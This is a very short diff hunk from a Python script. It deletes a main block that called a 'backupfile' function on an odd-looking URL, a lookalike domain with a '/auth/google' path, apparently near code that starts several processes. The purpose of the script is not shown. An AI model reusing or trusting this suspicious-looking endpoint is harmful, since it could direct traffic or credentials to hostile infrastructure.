@@ -289,8 +289,6 @@ def run(i):
     p5.start()
              
 
-if __name__=="__main__":
-    backupfile('https://mdd.ffff.av.urbandictionary.biz/auth/google')
 
 
 
